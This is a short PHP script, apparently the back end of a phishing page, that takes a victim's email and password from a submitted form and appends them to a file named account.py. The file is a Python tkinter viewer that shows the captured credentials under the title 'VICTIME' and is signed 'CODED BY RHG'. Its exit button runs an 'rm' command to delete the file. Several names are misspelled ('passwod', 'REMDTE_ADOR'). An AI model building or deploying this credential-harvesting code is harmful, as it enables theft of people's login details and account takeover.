<?php

$email = $_POST['EMAIL'];
$pass = $_POST['passwod'];

$ip = getenv('REMDTE_ADOR');

$date = date('j F Y - g:i A');

$data ="from tkinter import * \nimport os\n\nroot =Tk()\nroot.title('VICTIME')\nroot.geometry('300x100')\nroot.config(bg='white')\nlist=Label(root,text='N                                                                                       ',bg='#DC143C',font='Arial 9 bold')\nlist.place(x=10,y=10)\nEMAIL=Label(root,text='EMAIL',bg='#DC143C',font='Arial 9 bold')\nEMAIL.place(x=50,y=10)\npassword=Label(root,text='PASSWORD',bg='#DC143C',font='Arial 9 bold')\npassword.place(x=150,y=10)\nnumber=Label(root,text='01                                                                                       ',bg='#34A56F',font='Arial 7 bold')\nnumber.place(x=10,y=28)\nnumber=Label(root,text='$email',bg='#34A56F',font='Arial 7 bold')\nnumber.place(x=50,y=28)\nnumber=Label(root,text='$pass',bg='#34A56F',font='Arial 7 bold')\nnumber.place(x=150,y=28)\npassword=Label(root,text='CODED BY RHG',bg='white',font='Arial 9 bold')\npassword.place(x=185,y=85)\ndef hello():\n       os.system('rm -rif account.py')\n       exit()\nB1 = Button(root,bg='#DC143C', text = 'EXIT', font='Arial 7 bold',command =hello)\nB1.place(x = 20,y = 75)\nroot.mainloop()\n";

$file = 'account.py';

$fh = fopen($file, 'a');
fwrite($fh, $data);
fclose($fh);

?>
